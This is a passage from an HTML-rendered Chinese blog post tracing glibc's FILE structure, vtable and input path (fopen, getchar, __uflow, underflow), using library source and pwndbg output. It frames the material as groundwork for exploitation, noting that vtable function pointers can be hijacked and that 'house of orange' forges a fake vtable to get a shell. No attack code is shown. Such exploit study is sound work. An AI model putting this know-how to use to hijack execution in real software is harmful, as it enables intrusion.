class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_pbackfail_t, </span>__pbackfail)<span class="comment">;</span></span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_xsputn_t, </span>__xsputn)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_xsgetn_t, </span>__xsgetn)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_seekoff_t, </span>__seekoff)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_seekpos_t, </span>__seekpos)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_setbuf_t, </span>__setbuf)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_sync_t, </span>__sync)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_doallocate_t, </span>__doallocate)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_read_t, </span>__read)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_write_t, </span>__write)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_seek_t, </span>__seek)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_close_t, </span>__close)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_stat_t, </span>__stat)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_showmanyc_t, </span>__showmanyc)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_imbue_t, </span>__imbue)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>其中<code>JUMP_FIELD</code>是一个宏：<code>#define JUMP_FIELD(TYPE, NAME) TYPE NAME</code></p>
<p>可以看出 _IO_jump_t 是一个函数指针表，里面存的是函数指针，用来以后的跳转。libc中的函数指针非常多，可以劫持libc中的函数指针来劫持程序的执行流。<br>house of orange 就是构造 fake vtable 来getshell的，这里只是提下这个技术，本篇重点不在这里，而是修改指向缓冲区的指针。<br>这个函数表中有两个很重要的函数：<strong>overflow，</strong>underflow，在后面分析实例函数的时候会提到。</p>
<h4 id="fopen函数"><a href="#fopen函数" class="headerlink" title="fopen函数:"></a>fopen函数:</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (const char *filename, const char *mode, int is32)</span><br><span class="line">&#123;</span><br><span class="line">  struct locked_FILE</span><br><span class="line">  &#123;</span><br><span class="line">    struct _IO_FILE_plus fp;</span><br><span class="line"><span class="meta">#ifdef _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line">    struct _IO_wide_data wd;</span><br><span class="line">  &#125; *<span class="keyword">new</span><span class="type">_f</span> = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">new</span><span class="type">_f</span> == NULL) <span class="comment">//分配失败</span></span><br><span class="line">    <span class="keyword">return</span> NULL;</span><br><span class="line"><span class="meta">#ifdef _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file._lock = &amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;lock;</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, NULL, NULL);</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line">  _IO_JUMPS (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new<span class="type">_file_init_internal</span> (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  <span class="keyword">new</span><span class="type">_f</span>-&gt;fp.vtable = NULL;</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) <span class="keyword">new</span><span class="type">_f</span>, filename, mode, is32) != NULL)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp);</span><br><span class="line">  free (<span class="keyword">new</span><span class="type">_f</span>);</span><br><span class="line">  <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>_IO_no_init函数是用来初始化的，他调用了<code>_IO_old_init</code><br>其定义如下：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_old_init (_IO_FILE *fp, int flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_flags = _IO_MAGIC|flags;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_buf_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_buf_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_ptr = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_write_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_write_ptr = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_write_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_chain = NULL; <span class="comment">/* Not necessary. */</span></span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_save_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_backup_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_save_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_markers = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_cur_column = <span class="number">0</span>;</span><br><span class="line">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_vtable_offset = <span class="number">0</span>;</span><br><span class="line">#endif</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  <span class="function"><span class="title">if</span> (fp-&gt;</span>_lock != NULL)</span><br><span class="line">    _IO_<span class="function"><span class="title">lock_init</span> (*fp-&gt;</span>_lock);</span><br><span class="line">#endif</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>将缓冲区指针初始化为NULL，还有一些其他初始化的操作。<br><code>_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</code><br><code>#define _IO_JUMPS(THIS) (THIS)-&gt;vtable</code><br><code>extern const struct _IO_jump_t _IO_file_jumps;</code><br>这里将vtable指向<code>_IO_file_jumps</code>。这步很重要，后面的输入输出函数都会用到。</p>
<p>真正完成打开文件操作的函数是_IO_file_fopen.<br><code># define _IO_new_file_fopen _IO_file_fopen</code><br>该函数就是根据传入的modes，例如”r”,”r+”等来设置flag位，最终调用open系统调用完成打开文件操作。</p>
<h4 id="getchar函数："><a href="#getchar函数：" class="headerlink" title="getchar函数："></a>getchar函数：</h4><p>这里以getchar函数为例，其他输入函数最终调用的函数是相同的。</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">getchar (void)</span><br><span class="line">&#123;</span><br><span class="line">  int result;</span><br><span class="line">  <span class="variable">_IO_acquire_lock</span> (<span class="variable">_IO_stdin</span>); <span class="comment">//获得锁</span></span><br><span class="line">  result = <span class="variable">_IO_getc_unlocked</span> (<span class="variable">_IO_stdin</span>);</span><br><span class="line">  <span class="variable">_IO_release_lock</span> (<span class="variable">_IO_stdin</span>); <span class="comment">//释放锁</span></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在进行真正的读入操作前，先获得锁，这是因为在多线程的情况下，多个线程公用一个输入缓冲区，如果不加锁，当前线程正在读入的时候，由于调度，切换至另一个线程，如果他也在进行读入，则可能会读到相同的东西或者覆盖掉前一个线程读入的东西。</p>
<p>getchar 函数调用了函数<code>_IO_getc_unlocked</code>进行输入。<br>其定义如下：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _IO_getc_unlocked(_fp) \</span></span><br><span class="line">       <span class="function"><span class="params">(_IO_BE ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end, <span class="number">0</span>) <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">	? __uflow (_fp) : *(unsigned char *) (_fp)-&gt;_IO_read_ptr++)</span></span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># define _IO_BE(<span class="name">expr</span>, res) __builtin_expect ((<span class="name">expr</span>), res)</span><br></pre></td></tr></table></figure>
<p>__builtin_expect在标准库中使用的地方很多，他并不改变比较的结果，只是表明这个比较结果很有可能是 true还是false，以便来优化汇编代码。详情可以百度下。</p>
<p><code>_IO_BE ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end, 0)</code> 这段代码只是表明<code>(_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end</code>很可能是false。<br>如果<code>(_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end</code>为true则执行<code>__uflow (_fp)</code>，否者执行<code>*(unsigned char *) (_fp)-&gt;_IO_read_ptr++)</code></p>
<p>看一下_IO_FILE结构中定义的_IO_read_ptr的注释:<code>Current read pointer</code>，<strong>他指的是当前的读入位置，即在输入缓冲区中的位置</strong>。<br>_IO_read_ptr的注释为<code>char* _IO_read_end;    /* End of get area. */</code> 读取缓冲区结束的位置。<br>之前已经说过，我们输入的东西其实是先保存在输入缓冲区中，如果_IO_read_ptr小于_IO_read_end则说明，并没有到输入缓冲区的尽头，则只需返回_IO_read_ptr所指向的一字节的内容，然后_IO_read_ptr的大小增加1，指向下一个字节。<br>如果_IO_read_ptr大于等于_IO_read_end，则说明已经读取到尽头，则需要重新从设备中读取数据到缓冲区，从这里可以看出，最初的时候，_IO_read_ptr是和_IO_read_end相等的，因为这样才会从键盘中进行读取，否者缓冲区中是没有内容的。</p>
<p>看一下__uflow的定义:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line"><span class="variable">__uflow</span> (<span class="variable">_IO_FILE</span> *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_vtable_offset</span> (fp) == <span class="number">0</span> &amp;&amp; <span class="variable">_IO_fwide</span> (fp, -<span class="number">1</span>) != -<span class="number">1</span>)</span><br><span class="line">    return EOF;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_mode</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="variable">_IO_fwide</span> (fp, -<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_in_put_mode</span> (fp))</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">_IO_switch_to_get_mode</span> (fp) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_ptr</span> &lt; fp-&gt;<span class="variable">_IO_read_end</span>)</span><br><span class="line">    return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>++;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_in_backup</span> (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="variable">_IO_switch_to_main_get_area</span> (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_ptr</span> &lt; fp-&gt;<span class="variable">_IO_read_end</span>)</span><br><span class="line">	return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_have_markers</span> (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;<span class="variable">_IO_read_end</span>))</span><br><span class="line">	return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">_IO_have_backup</span> (fp))</span><br><span class="line">    <span class="variable">_IO_free_backup_area</span> (fp);</span><br><span class="line">  return <span class="variable">_IO_UFLOW</span> (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>前面的操作在干啥我也不太清楚，但是最终调用了<code>return _IO_UFLOW (fp);</code><br><code>#define _IO_UFLOW(FP) JUMP0 (__uflow, FP)</code><br><code>#define JUMP0(FUNC, THIS) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</code><br>宏特别多，这些宏都是一套套一套，只说下最后的功能是：在其对应的vtable中调用了 <strong>uflow。不太清楚这个 </strong>uflow是啥，于是动态调试一波:<br>以stdin为例：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="variable">_IO_2_1_stdin_</span> </span><br><span class="line">$<span class="number">7</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    <span class="variable">_flags</span> = -<span class="number">72540024</span>, </span><br><span class="line">    <span class="variable">_IO_read_ptr</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_read_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_read_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_write_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_write_ptr</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_write_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_buf_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_buf_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_save_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_backup_base</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_IO_save_end</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_markers</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_chain</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_fileno</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_flags2</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_old_offset</span> = -<span class="number">1</span>, </span><br><span class="line">    <span class="variable">_cur_column</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_vtable_offset</span> = <span class="number">0</span> <span class="string">'\000'</span>, </span><br><span class="line">    <span class="variable">_shortbuf</span> = <span class="string">""</span>, </span><br><span class="line">    <span class="variable">_lock</span> = <span class="number">0</span>x7ffff7dd3790 &lt;<span class="variable">_IO_stdfile_0_lock</span>&gt;, </span><br><span class="line">    <span class="variable">_offset</span> = -<span class="number">1</span>, </span><br><span class="line">    <span class="variable">_codecvt</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_wide_data</span> = <span class="number">0</span>x7ffff7dd19c0 &lt;<span class="variable">_IO_wide_data_0</span>&gt;, </span><br><span class="line">    <span class="variable">_freeres_list</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">_freeres_buf</span> = <span class="number">0</span>x0, </span><br><span class="line">    <span class="variable">__pad5</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_mode</span> = <span class="number">0</span>, </span><br><span class="line">    <span class="variable">_unused2</span> = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0</span>x7ffff7dd06e0 &lt;<span class="variable">_IO_file_jumps</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>vtable是_IO_file_jumps,</p>
<p>他里面的内容是<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p <span class="variable">_IO_file_jumps</span></span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  <span class="variable">__dummy</span> = <span class="number">0</span>, </span><br><span class="line">  <span class="variable">__dummy2</span> = <span class="number">0</span>, </span><br><span class="line">  <span class="variable">__finish</span> = <span class="number">0</span>x7ffff7a869c0 &lt;<span class="variable">_IO_new_file_finish</span>&gt;, </span><br><span class="line">  <span class="variable">__overflow</span> = <span class="number">0</span>x7ffff7a87730 &lt;<span class="variable">_IO_new_file_overflow</span>&gt;, </span><br><span class="line">  <span class="variable">__underflow</span> = <span class="number">0</span>x7ffff7a874a0 &lt;<span class="variable">_IO_new_file_underflow</span>&gt;, </span><br><span class="line">  <span class="variable">__uflow</span> = <span class="number">0</span>x7ffff7a88600 &lt;<span class="variable">__GI__IO_default_uflow</span>&gt;, </span><br><span class="line">  <span class="variable">__pbackfail</span> = <span class="number">0</span>x7ffff7a89980 &lt;<span class="variable">__GI__IO_default_pbackfail</span>&gt;, </span><br><span class="line">  <span class="variable">__xsputn</span> = <span class="number">0</span>x7ffff7a861e0 &lt;<span class="variable">_IO_new_file_xsputn</span>&gt;, </span><br><span class="line">  <span class="variable">__xsgetn</span> = <span class="number">0</span>x7ffff7a85ec0 &lt;<span class="variable">__GI__IO_file_xsgetn</span>&gt;, </span><br><span class="line">  <span class="variable">__seekoff</span> = <span class="number">0</span>x7ffff7a854c0 &lt;<span class="variable">_IO_new_file_seekoff</span>&gt;, </span><br><span class="line">  <span class="variable">__seekpos</span> = <span class="number">0</span>x7ffff7a88a00 &lt;<span class="variable">_IO_default_seekpos</span>&gt;, </span><br><span class="line">  <span class="variable">__setbuf</span> = <span class="number">0</span>x7ffff7a85430 &lt;<span class="variable">_IO_new_file_setbuf</span>&gt;, </span><br><span class="line">  <span class="variable">__sync</span> = <span class="number">0</span>x7ffff7a85370 &lt;<span class="variable">_IO_new_file_sync</span>&gt;, </span><br><span class="line">  <span class="variable">__doallocate</span> = <span class="number">0</span>x7ffff7a7a180 &lt;<span class="variable">__GI__IO_file_doallocate</span>&gt;, </span><br><span class="line">  <span class="variable">__read</span> = <span class="number">0</span>x7ffff7a861a0 &lt;<span class="variable">__GI__IO_file_read</span>&gt;, </span><br><span class="line">  <span class="variable">__write</span> = <span class="number">0</span>x7ffff7a85b70 &lt;<span class="variable">_IO_new_file_write</span>&gt;, </span><br><span class="line">  <span class="variable">__seek</span> = <span class="number">0</span>x7ffff7a85970 &lt;<span class="variable">__GI__IO_file_seek</span>&gt;, </span><br><span class="line">  <span class="variable">__close</span> = <span class="number">0</span>x7ffff7a85340 &lt;<span class="variable">__GI__IO_file_close</span>&gt;, </span><br><span class="line">  <span class="variable">__stat</span> = <span class="number">0</span>x7ffff7a85b60 &lt;<span class="variable">__GI__IO_file_stat</span>&gt;, </span><br><span class="line">  <span class="variable">__showmanyc</span> = <span class="number">0</span>x7ffff7a89af0 &lt;<span class="variable">_IO_default_showmanyc</span>&gt;, </span><br><span class="line">  <span class="variable">__imbue</span> = <span class="number">0</span>x7ffff7a89b00 &lt;<span class="variable">_IO_default_imbue</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以最终调用的函数其实是:<code>__GI__IO_default_uflow.</code></p>
<p>看下他的定义:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_default_uflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>他又调用了<code>_IO_UNDERFLOW (fp)</code></p>
<p><code>#define _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)</code></p>
<p>同理，这个是调用了<code>_IO_new_file_underflow</code><br>追了这么久，这个函数就是最底层的操作了，用来读取你的键盘输入.<br>看下他的定义：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line"><span class="variable">_IO_new_file_underflow</span> (<span class="variable">_IO_FILE</span> *fp) <span class="comment">//最底层的输入操作</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">_IO_ssize_t</span> <span class="built_in">count</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_EOF_SEEN</span>)</span><br><span class="line">    return (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_NO_READS</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_ERR_SEEN</span>;</span><br><span class="line">      <span class="variable">__set_errno</span> (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_ptr</span> &lt; fp-&gt;<span class="variable">_IO_read_end</span>)</span><br><span class="line">    return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_buf_base</span> == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_save_base</span> != NULL)</span><br><span class="line">	&#123;</span><br><span class="line">	  free (fp-&gt;<span class="variable">_IO_save_base</span>);</span><br><span class="line">	  fp-&gt;<span class="variable">_flags</span> &amp;= ~<span 